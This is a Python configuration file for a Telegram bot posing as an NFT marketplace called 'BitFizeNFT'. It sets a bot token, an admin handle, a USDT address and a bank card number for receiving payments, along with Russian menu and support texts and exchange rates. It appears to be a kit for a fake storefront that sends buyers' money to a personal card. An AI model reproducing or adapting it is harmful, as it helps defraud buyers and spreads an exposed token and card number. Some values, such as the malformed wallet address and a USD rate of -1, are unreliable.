BOT_TOKEN = '5860050965:AAGsK7oNZeuWHUBThngBqN_ZexaYIy83JRI' # Вставить токен от бота Telegtam
ADMIN_ID = 'adr1k_0' # ID, которому будет доставляться сообщения
USDT = '0xdwhgKDG' # USDT, на который будут переводить
CARD = '2200 7007 5429 0343' # Карта, на которую будут переводить
photo_caption = 'https://topflightapps.com/wp-content/uploads/2022/01/create-nft-marketplace-website-concept-1.jpg' # Фото для меню
information = 'О Сервисе/nBitFizeNFT — торговая площадка для невзаимозаменяемых токенов (NFT). Покупайте, продавайте и открывайте для себя эксклюзивные цифровые предметы' # Информация в вкладке 'Информация'
support = 'Правила обращения в Техническую Поддержку:/n🔹1. Представьтесь, изложите проблему своими словами - мы постараемся Вам помочь./n🔹2. Напишите свой ID - нам это нужно, чтобы увидеть ваш профиль, и узнать актуальность вашей проблемы./n🔹3. Будьте вежливы, наши консультанты не роботы, мы постараемся помочь Вам, и сделать все возможное, чтобы сберечь ваше время и обеспечить максимальную оперативность в работе./nНапишите нам, ответ Поддержки, не заставит вас долго ждать!@bitfize' # Информация в вкладке 'Тех поддержка'
##### ВАЛЮТЫ ПО ОТНОШЕНИЮ К ДОЛЛАРУ#####
RUB = 70 # Курс доллара к рублю
UAH = 35 # Курс доллара к рублю
USD = -1
EUR = 80 # Курс доллара к евро
PLN = 17 # Курс доллара к польше?
BLN = 17 # Курс доллара к бел. рублю


#создатель бота @fainiy_hlop